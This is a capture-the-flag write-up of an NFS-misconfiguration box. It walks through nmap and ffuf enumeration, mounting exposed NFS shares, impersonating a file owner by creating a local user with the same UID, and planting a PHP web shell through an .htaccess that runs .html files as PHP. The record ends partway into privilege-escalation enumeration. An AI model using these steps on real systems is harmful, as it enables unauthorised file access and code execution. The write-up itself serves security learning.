## Description
Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging misconfigurations in NFS shares through impersonating users. Additionally, the box incorporates the enumeration of an X11 display into the privilege escalation by having the attacker take a screenshot of the current Desktop.
## Information gathering
Let's discover the services running on the machines with a TCP scan:
```
$sudo nmap -p- 10.129.228.109 -O -oN scans/nmap_full -v
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-03 14:58 CET
Initiating Ping Scan at 14:58
Scanning 10.129.228.109 [4 ports]
Completed Ping Scan at 14:58, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:58
Completed Parallel DNS resolution of 1 host. at 14:58, 0.01s elapsed
Initiating SYN Stealth Scan at 14:58
Scanning 10.129.228.109 [65535 ports]
Discovered open port 22/tcp on 10.129.228.109
Discovered open port 80/tcp on 10.129.228.109
Increasing send delay for 10.129.228.109 from 0 to 5 due to 11 out of 21 dropped probes since last increase.
Discovered open port 111/tcp on 10.129.228.109
SYN Stealth Scan Timing: About 6.01% done; ETC: 15:07 (0:08:05 remaining)
Discovered open port 38767/tcp on 10.129.228.109
SYN Stealth Scan Timing: About 13.08% done; ETC: 15:06 (0:06:45 remaining)
SYN Stealth Scan Timing: About 19.95% done; ETC: 15:06 (0:06:05 remaining)
SYN Stealth Scan Timing: About 26.72% done; ETC: 15:06 (0:05:32 remaining)
SYN Stealth Scan Timing: About 33.69% done; ETC: 15:06 (0:04:57 remaining)
SYN Stealth Scan Timing: About 40.80% done; ETC: 15:06 (0:04:23 remaining)
Discovered open port 51323/tcp on 10.129.228.109
SYN Stealth Scan Timing: About 48.09% done; ETC: 15:06 (0:03:48 remaining)
SYN Stealth Scan Timing: About 54.95% done; ETC: 15:06 (0:03:18 remaining)
Discovered open port 38641/tcp on 10.129.228.109
SYN Stealth Scan Timing: About 61.76% done; ETC: 15:06 (0:02:48 remaining)
Discovered open port 46389/tcp on 10.129.228.109
SYN Stealth Scan Timing: About 68.42% done; ETC: 15:06 (0:02:19 remaining)
Increasing send delay for 10.129.228.109 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.228.109 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.228.109 from 20 to 40 due to max_successful_tryno increase to 6
SYN Stealth Scan Timing: About 78.14% done; ETC: 15:08 (0:02:04 remaining)
Discovered open port 2049/tcp on 10.129.228.109
Increasing send delay for 10.129.228.109 from 40 to 80 due to max_successful_tryno increase to 7
SYN Stealth Scan Timing: About 82.15% done; ETC: 15:10 (0:02:03 remaining)
SYN Stealth Scan Timing: About 84.47% done; ETC: 15:12 (0:02:08 remaining)
SYN Stealth Scan Timing: About 86.82% done; ETC: 15:14 (0:02:05 remaining)
SYN Stealth Scan Timing: About 89.14% done; ETC: 15:16 (0:01:56 remaining)
SYN Stealth Scan Timing: About 91.29% done; ETC: 15:18 (0:01:42 remaining)
SYN Stealth Scan Timing: About 93.18% done; ETC: 15:19 (0:01:25 remaining)
SYN Stealth Scan Timing: About 94.78% done; ETC: 15:21 (0:01:09 remaining)
SYN Stealth Scan Timing: About 96.06% done; ETC: 15:21 (0:00:54 remaining)
SYN Stealth Scan Timing: About 97.10% done; ETC: 15:22 (0:00:41 remaining)
SYN Stealth Scan Timing: About 97.88% done; ETC: 15:23 (0:00:31 remaining)
Completed SYN Stealth Scan at 15:25, 1565.25s elapsed (65535 total ports)
Initiating OS detection (try #1) against 10.129.228.109
Retrying OS detection (try #2) against 10.129.228.109
Retrying OS detection (try #3) against 10.129.228.109
Retrying OS detection (try #4) against 10.129.228.109
Retrying OS detection (try #5) against 10.129.228.109
Nmap scan report for 10.129.228.109
Host is up (0.030s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
38641/tcp open  unknown
38767/tcp open  unknown
46389/tcp open  unknown
51323/tcp open  unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/3%OT=22%CT=1%CU=35247%PV=Y%DS=2%DC=I%G=Y%TM=656C8FC
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 49.220 days (since Sun Oct 15 11:08:56 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1577.62 seconds
           Raw packets sent: 68698 (3.027MB) | Rcvd: 69730 (3.622MB)
```
It looks like something is preventing us getting information about the OS. However, we can see open ports, so we can look at them (some ports changed from one boot of the machine to another):
```
$sudo nmap -p22,80,111,2049,36923,39159,56097,58119 -sC -sV 10.129.228.109
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-27 16:56 CET
Nmap scan report for 10.129.228.109
Host is up (0.021s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36485/udp   mountd
|   100005  1,2,3      39159/tcp   mountd
|   100005  1,2,3      50543/tcp6  mountd
|   100005  1,2,3      57294/udp6  mountd
|   100021  1,3,4      36923/tcp   nlockmgr
|   100021  1,3,4      45833/tcp6  nlockmgr
|   100021  1,3,4      53392/udp   nlockmgr
|   100021  1,3,4      59270/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
36923/tcp open  nlockmgr 1-4 (RPC #100021)
39159/tcp open  mountd   1-3 (RPC #100005)
56097/tcp open  mountd   1-3 (RPC #100005)
58119/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
```
### Web server
There is a web server running on port 80 with Apache 2.4.41. It is a static website presenting Built Better company and services. There is a login button on the home page, but it redirects to nothing.
Let's look for any hidden pages and directories:
```
$ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.11.93/FUZZ -ic -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.11.93/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 31ms]
| URL | http://10.129.11.93/css
| --> | http://10.129.11.93/css/
    * FUZZ: css

[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 32ms]
| URL | http://10.129.11.93/js
| --> | http://10.129.11.93/js/
    * FUZZ: js

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3339ms]
| URL | http://10.129.11.93/images
| --> | http://10.129.11.93/images/
    * FUZZ: images

[Status: 200, Size: 32532, Words: 13031, Lines: 581, Duration: 3339ms]
| URL | http://10.129.11.93/
    * FUZZ: 

[Status: 200, Size: 32532, Words: 13031, Lines: 581, Duration: 33ms]
| URL | http://10.129.11.93/
    * FUZZ: 

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 32ms]
| URL | http://10.129.11.93/server-status
    * FUZZ: server-status

:: Progress: [1273820/1273820] :: Job [1/1] :: 1163 req/sec :: Duration: [0:18:23] :: Errors: 0 ::
```
There is nothing interesting in these directories and the page `server-status` is forbidden.
### `rpcbind`
Port 111 is open with `rpcbind` service running on it. The following command can be used to get TCP and UDP services using RPC:
```
$sudo nmap -sSUC -p111  10.129.11.93
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-04 16:06 CET
Nmap scan report for 10.129.11.93
Host is up (0.032s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      43572/udp   mountd
|   100005  1,2,3      54119/tcp   mountd
|   100021  1,3,4      33833/tcp   nlockmgr
|   100021  1,3,4      54907/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
111/udp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      43572/udp   mountd
|   100005  1,2,3      54119/tcp   mountd
|   100021  1,3,4      33833/tcp   nlockmgr
|   100021  1,3,4      54907/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl

Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds
```
### NFS
We saw that there is an NFS service running. Let's look at it:
```
$nmap -p111 --script=nfs-ls,nfs-showmount,nfs-statfs 10.129.11.93
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-04 16:18 CET
Nmap scan report for 10.129.11.93
Host is up (0.032s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|   /home/ross *
|_  /var/www/html *
```
We can see that we can have access to two directories. Let's look at their content:
```
$sudo mkdir /mnt/nfs
$sudo mount -t nfs 10.129.11.93:/home/ross /mnt/nfs -o nolock
$tree /mnt/nfs
/mnt/nfs
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos
```
There is a file `Passwords.kbdx` in the `Documents` folder. Let's copy and it.

Let's look at the other directory:
```
$sudo mount -t nfs 10.129.11.93:/var/www/html /mnt/nfs -o nolock
$ls -a /mnt/nfswww
ls: cannot access '/mnt/nfswww/.': Permission denied
ls: cannot access '/mnt/nfswww/..': Permission denied
ls: cannot access '/mnt/nfswww/.htaccess': Permission denied
ls: cannot access '/mnt/nfswww/index.html': Permission denied
ls: cannot access '/mnt/nfswww/images': Permission denied
ls: cannot access '/mnt/nfswww/css': Permission denied
ls: cannot access '/mnt/nfswww/js': Permission denied
.  ..  css  .htaccess  images  index.html  js
```
There are files, but we do not have the permissions on them.
## Vulnerability assessment
## Exploitation
### KeePass file
Let's try to bruteforce the file `Passwords.kbdx`:
```
$keepass2john Passwords.kdbx > hash
! Passwords.kdbx : File version '40000' is currently not supported!
```
Apparently, the version of the database is not supported by `keepass2john`. It will not be possible to get the hashes.
### NFS server
If you have control on the client who tries to connect to the NFS server, you can read all the files because the authorization mechanism is based on the UID/GID of the client. For instance, we can see that we have no access to the folder `/var/www/html`. Some nmap scripts let us know which UID/GID have the permissions on this folder:
```
$sudo nmap --script=nfs* 10.129.11.93 -sV -p111,2049
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-04 17:16 CET
Nmap scan report for 10.129.11.93
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /home/ross
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID   GID   SIZE  TIME                 FILENAME
| rwxr-xr-x   1001  1001  4096  2024-02-04T14:52:02  .
| ??????????  ?     ?     ?     ?                    ..
| rwx------   1001  1001  4096  2022-10-21T14:57:01  .cache
| rwx------   1001  1001  4096  2022-10-21T14:57:01  .config
| rwx------   1001  1001  4096  2022-10-21T14:57:01  .local
| rw-------   1001  1001  2475  2022-12-27T15:33:41  .xsession-errors.old
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Documents
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Music
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Pictures
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Public
| 
| 
| Volume /var/www/html
|   access: Read NoLookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID   GID  SIZE  TIME                 FILENAME
| rwxr-xr--   2017  33   4096  2024-02-04T16:15:01  .
| ??????????  ?     ?    ?     ?                    ..
| ??????????  ?     ?    ?     ?                    .htaccess
| ??????????  ?     ?    ?     ?                    css
| ??????????  ?     ?    ?     ?                    images
| ??????????  ?     ?    ?     ?                    index.html
| ??????????  ?     ?    ?     ?                    js
|_
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39421/tcp6  mountd
|   100005  1,2,3      43572/udp   mountd
|   100005  1,2,3      46210/udp6  mountd
|   100005  1,2,3      54119/tcp   mountd
|   100021  1,3,4      33833/tcp   nlockmgr
|   100021  1,3,4      34915/tcp6  nlockmgr
|   100021  1,3,4      54907/udp   nlockmgr
|   100021  1,3,4      55920/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
| nfs-showmount: 
|   /home/ross *
|_  /var/www/html *
| nfs-statfs: 
|   Filesystem     1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|   /home/ross     6071864.0  4636956.0  1355160.0  78%   16.0T        32000
|_  /var/www/html  6071864.0  4636956.0  1355160.0  78%   16.0T        32000
2049/tcp open  nfs_acl 3 (RPC #100227)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```
We can see that the folder `/var/www/html` can be access with UID=2017 or GID=33. Let's create a user with these IDs on my system:
```
$sudo useradd user2017 -u 2017 -g 33 -s /bin/bash
$sudo su user2017
$ls -la /mnt/nfswww/
bash: /dev/stderr: Permission denied
total 52
drwxr-xr-- 5 user2017 www-data  4096  4 févr. 17:25 .
drwxr-xr-x 1 root     root        26  4 févr. 16:31 ..
drwxr-xr-x 2 user2017 www-data  4096  4 févr. 17:25 css
-rw-r--r-- 1 user2017 www-data    44 21 oct.   2022 .htaccess
drwxr-xr-x 2 user2017 www-data  4096  4 févr. 17:25 images
-rw-r----- 1 user2017 www-data 32532  4 févr. 17:25 index.html
drwxr-xr-x 2 user2017 www-data  4096  4 févr. 17:25 js
```
This user can see the content of the folder:
```
$cat /mnt/nfswww/.htaccess 
AddType application/x-httpd-php .htm .html
```
We can see that PHP files can be executed on the server. Let's create a PHP file using a [web shell](https://www.revshells.com/). We can now run this new page from the website and get the flag:
```
cat /home/alex/user.txt
f[...]a
```
## Privilege escalation
### Enumeration
Let's manually enumerate the target. First, we look at the processes run by root:
```
$ ps aux | grep root
ps aux | grep root
root           1  1.0  0.5 168268 11764 ?        Ss   09:14   0:02 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    09:14   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   09:14   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   09:14   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/0:0-cgroup_destroy]
root           6  0.0  0.0      0     0 ?        I<   09:14   0:00 [kworker/0:0H-events_highpri]
root           7  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/u4:0-events_unbound]
root           8  0.0  0.0      0     0 ?        I<   09:14   0:00 [kworker/0:1H-events_highpri]
root           9  0.0  0.0      0     0 ?        I<   09:14   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    09:14   0:00 [ksoftirqd/0]
root          11  0.0  0.0      0     0 ?        I    09:14   0:00 [rcu_sched]
root          12  0.0  0.0      0     0 ?        S    09:14   0:00 [migration/0]
root          13  0.0  0.0      0     0 ?        S    09:14   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/0:1-events]
root          15  0.0  0.0      0     0 ?        S    09:14   0:00 [cpuhp/0]
root          16  0.0  0.0      0     0 ?        S    09:14   0:00 [cpuhp/1]
root          17  0.0  0.0      0     0 ?        S    09:14   0:00 [idle_inject/1]
root          18  0.0  0.0      0     0 ?        S    09:14   0:00 [migration/1]
root          19  0.0  0.0      0     0 ?        S    09:14   0:00 [ksoftirqd/1]
root          20  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/1:0-memcg_kmem_cache]
root          21  0.0  0.0      0     0 ?        I<   09:14   0:00 [kworker/1:0H-events_highpri]
root          22  0.0  0.0      0     0 ?        S    09:14   0:00 [kdevtmpfs]
root          23  0.0  0.0      0     0 ?        I<   09:14   0:00 [netns]
root          24  0.0  0.0      0     0 ?        S    09:14   0:00 [rcu_tasks_kthre]
root          25  0.0  0.0      0     0 ?        S    09:14   0:00 [kauditd]
root          26  0.0  0.0      0     0 ?        S    09:14   0:00 [khungtaskd]
root          27  0.0  0.0      0     0 ?        S    09:14   0:00 [oom_reaper]
root          28  0.0  0.0      0     0 ?        I<   09:14   0:00 [writeback]
root          29  0.0  0.0      0     0 ?        S    09:14   0:00 [kcompactd0]
root          30  0.0  0.0      0     0 ?        SN   09:14   0:00 [ksmd]
root          31  0.0  0.0      0     0 ?        SN   09:14   0:00 [khugepaged]
root          36  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/1:1-events]
root          78  0.0  0.0      0     0 ?        I<   09:14   0:00 [kintegrityd]
root          79  0.0  0.0      0     0 ?        I<   09:14   0:00 [kblockd]
root          80  0.0  0.0      0     0 ?        I<   09:14   0:00 [blkcg_punt_bio]
root          81  0.0  0.0      0     0 ?        I<   09:14   0:00 [tpm_dev_wq]
root          82  0.0  0.0      0     0 ?        I<   09:14   0:00 [ata_sff]
root          83  0.0  0.0      0     0 ?        I<   09:14   0:00 [md]
root          84  0.0  0.0      0     0 ?        I<   09:14   0:00 [edac-poller]
root          85  0.0  0.0      0     0 ?        I<   09:14   0:00 [devfreq_wq]
root          86  0.0  0.0      0     0 ?        S    09:14   0:00 [watchdogd]
root          87  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/u4:1-events_power_efficient]
root          89  0.0  0.0      0     0 ?        S    09:14   0:00 [kswapd0]
root          90  0.0  0.0      0     0 ?        S    09:14   0:00 [ecryptfs-kthrea]
root          92  0.0  0.0      0     0 ?        I<   09:14   0:00 [kthrotld]
root          93  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/24-pciehp]
root          94  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/25-pciehp]
root          95  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/26-pciehp]
root          96  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/27-pciehp]
root          97  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/28-pciehp]
root          98  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/29-pciehp]
root          99  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/30-pciehp]
root         100  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/31-pciehp]
root         101  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/32-pciehp]
root         102  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/33-pciehp]
root         103  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/34-pciehp]
root         104  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/35-pciehp]
root         105  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/36-pciehp]
root         106  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/37-pciehp]
root         107  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/38-pciehp]
root         108  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/39-pciehp]
root         109  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/40-pciehp]
root         110  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/41-pciehp]
root         111  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/42-pciehp]
root         112  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/43-pciehp]
root         113  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/44-pciehp]
root         114  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/45-pciehp]
root         115  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/46-pciehp]
root         116  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/47-pciehp]
root         117  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/48-pciehp]
root         118  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/49-pciehp]
root         119  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/50-pciehp]
root         120  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/51-pciehp]
root         121  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/52-pciehp]
root         122  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/53-pciehp]
root         123  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/54-pciehp]
root         124  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/55-pciehp]
root         125  0.0  0.0      0     0 ?        I<   09:14   0:00 [acpi_thermal_pm]
root         126  0.0  0.0      0     0 ?        S    09:14   0:00 [scsi_eh_0]
root         127  0.0  0.0      0     0 ?        I<   09:14   0:00 [scsi_tmf_0]
root         128  0.0  0.0      0     0 ?        S    09:14   0:00 [scsi_eh_1]
root         129  0.0  0.0      0     0 ?        I<   09:14   0:00 [scsi_tmf_1]
root         130  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/u4:2-events_power_efficient]
root         131  0.0  0.0      0     0 ?        I<   09:14   0:00 [vfio-irqfd-clea]
root         132  0.0  0.0      0     0 ?        I<   09:14   0:00 [kworker/1:1H-events_highpri]
root         133  0.0  0.0      0     0 ?        I<   09:14   0:00 [ipv6_addrconf]
root         134  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/u4:3]
root         143  0.0  0.0      0     0 ?        I<   09:14   0:00 [kstrp]
root         146  0.0  0.0      0     0 ?        I<   09:14   0:00 [kworker/u5:0-xprtiod]
root         159  0.0  0.0      0     0 ?        I<   09:14   0:00 [charger_manager]
root         198  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/1:2-events]
root         199  0.0  0.0      0     0 ?        I<   09:14   0:00 [mpt_poll_0]
root         200  0.0  0.0      0     0 ?        I<   09:14   0:00 [mpt/0]
root         201  0.0  0.0      0     0 ?        S    09:14   0:00 [irq/16-vmwgfx]
root         202  0.0  0.0      0     0 ?        I<   09:14   0:00 [ttm_swap]
root         203  0.0  0.0      0     0 ?        I<   09:14   0:00 [cryptd]
root         237  0.0  0.0      0     0 ?        S    09:14   0:00 [scsi_eh_2]
root         238  0.0  0.0      0     0 ?        I<   09:14   0:00 [scsi_tmf_2]
root         265  0.0  0.0      0     0 ?        I<   09:14   0:00 [raid5wq]
root         308  0.0  0.0      0     0 ?        S    09:14   0:00 [jbd2/sda1-8]
root         309  0.0  0.0      0     0 ?        I<   09:14   0:00 [ext4-rsv-conver]
root         342  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/0:2-memcg_kmem_cache]
root         376  0.1  0.6  62444 13228 ?        S<s  09:14   0:00 /lib/systemd/systemd-journald
root         381  0.0  0.0      0     0 ?        I<   09:14   0:00 [rpciod]
root         382  0.0  0.0      0     0 ?        I<   09:14   0:00 [xprtiod]
root         405  0.0  0.0   5384   164 ?        Ss   09:14   0:00 /usr/sbin/blkmapd
root         408  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/0:3-events]
root         416  0.0  0.0      0     0 ?        I    09:14   0:00 [kworker/0:4-events]
root         417  0.3  0.3  24672  7552 ?        Ss   09:14   0:00 /lib/systemd/systemd-udevd
root         468  0.0  0.0      0     0 ?        I<   09:15   0:00 [nfit]
root         559  0.0  0.0      0     0 ?        I<   09:15   0:00 [kaluad]
root         560  0.0  0.0      0     0 ?        I<   09:15   0:00 [kmpath_rdacd]
root         561  0.0  0.0      0     0 ?        I<   09:15   0:00 [kmpathd]
root         562  0.0  0.0      0     0 ?        I<   09:15   0:00 [kmpath_handlerd]
root         563  0.0  0.8 280180 17992 ?        SLsl 09:15   0:00 /sbin/multipathd -d -s
root         572  0.0  0.0      0     0 ?        S<   09:15   0:00 [loop0]
root         575  0.0  0.0      0     0 ?        S<   09:15   0:00 [loop1]
root         576  0.0  0.0      0     0 ?        S<   09:15   0:00 [loop2]
root         577  0.0  0.0      0     0 ?        S<   09:15   0:00 [loop3]
root         596  0.0  0.0   3176   168 ?        Ss   09:15   0:00 /usr/sbin/rpc.idmapd
root         616  0.0  0.5  47536 10412 ?        Ss   09:15   0:00 /usr/bin/VGAuthService
root         621  0.1  0.4 237804  8444 ?        Ssl  09:15   0:00 /usr/bin/vmtoolsd
root         636  0.0  0.0      0     0 ?        I    09:15   0:00 [kworker/1:3-cgroup_destroy]
root         662  0.0  0.2  99896  5828 ?        Ssl  09:15   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
root         693  0.0  0.4 239340  9412 ?        Ssl  09:15   0:00 /usr/lib/accountsservice/accounts-daemon
root         697  0.0  1.0 261952 21072 ?        Ssl  09:15   0:00 /usr/sbin/NetworkManager --no-daemon
root         707  0.0  0.1  81956  3640 ?        Ssl  09:15   0:00 /usr/sbin/irqbalance --foreground
root         710  0.1  0.5 238996 11540 ?        Ssl  09:15   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         713  0.3  2.0 874896 41368 ?        Ssl  09:15   0:00 /usr/lib/snapd/snapd
root         714  0.0  0.2 232996  5956 ?        Ssl  09:15   0:00 /usr/libexec/switcheroo-control
root         715  0.0  0.3  17352  8052 ?        Ss   09:15   0:00 /lib/systemd/systemd-logind
root         716  0.0  0.6 396016 13904 ?        Ssl  09:15   0:00 /usr/lib/udisks2/udisksd
root         718  0.0  0.2  13676  4984 ?        Ss   09:15   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
avahi        721  0.0  0.0   8340   320 ?        S    09:15   0:00 avahi-daemon: chroot helper
root         727  0.0  0.0      0     0 ?        I    09:15   0:00 [kworker/0:5-cgroup_destroy]
root         729  0.0  0.0      0     0 ?        I    09:15   0:00 [kworker/0:6-memcg_kmem_cache]
root         790  0.0  0.6 178388 12532 ?        Ssl  09:15   0:00 /usr/sbin/cups-browsed
root         800  0.1  0.6 319216 13452 ?        Ssl  09:15   0:00 /usr/sbin/ModemManager
root         954  0.0  0.4  25832  8988 ?        Ss   09:15   0:00 /usr/sbin/cupsd -l
root         963  0.0  0.1   6816  2788 ?        Ss   09:15   0:00 /usr/sbin/cron -f
root         975  0.0  0.0      0     0 ?        I    09:15   0:00 [kworker/0:7-events]
root         981  0.0  0.4 236276  9448 ?        Ssl  09:15   0:00 /usr/sbin/lightdm
root         987  0.0  0.0   5828  1844 tty1     Ss+  09:15   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
